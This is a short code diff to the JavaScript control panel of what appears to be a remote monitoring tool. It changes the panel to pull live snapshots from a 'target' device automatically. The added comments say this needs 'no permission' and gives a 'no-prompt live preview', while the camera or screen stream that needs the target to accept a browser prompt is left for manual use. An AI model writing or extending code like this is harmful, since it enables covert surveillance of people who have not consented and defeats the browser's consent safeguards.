@@ -161,7 +161,7 @@ function startSnapshotPolling(targetId) {
     stopSnapshotPolling();
     remoteLog(`Starting Live Snapshot session for: ${targetId}`);
     requestSnapshot(targetId);
-    snapshotInterval = setInterval(() => requestSnapshot(targetId), 800); // 800ms polling for smoother feel
+    snapshotInterval = setInterval(() => requestSnapshot(targetId), 1000); // 1s polling for no-prompt live preview
 }
 
 function stopSnapshotPolling() {
@@ -445,9 +445,9 @@ function openDevicePanel(device) {
     // Render Uptime Chart (Simulated from history)
     renderUptime(device.history || []);
 
-    // Automate Live Stream if online
+    // Automate Live Snapshot (No permission required)
     if (isOnline) {
-        requestStream();
+        requestSnapshot(currentTargetId);
     }
 
     // Show Modal
@@ -473,7 +473,7 @@ function clearReceiver() {
 
 window.requestStream = function () {
     if (!currentTargetId || !ws) return;
-    showToast('Establishing Live Stream...');
+    showToast('Requesting High-Quality Video (Accept browser prompt on target)...');
     ws.send(JSON.stringify({ type: 'stream:request', targetId: currentTargetId }));
 };
 
